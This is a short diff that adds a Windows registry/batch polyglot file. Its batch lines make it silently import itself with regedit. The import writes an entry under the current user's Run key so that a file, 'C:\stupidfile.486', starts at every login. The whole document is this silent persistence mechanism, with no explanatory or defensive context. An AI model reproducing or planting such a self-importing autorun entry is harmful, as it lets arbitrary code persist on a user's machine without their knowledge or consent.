@@ -1,0 +1,9 @@
+REGEDIT4
+
+; @ECHO OFF
+; CLS
+; REGEDIT.EXE /S "%~f0"
+; EXIT
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+"fourexetysic"="C:\stupidfile.486"
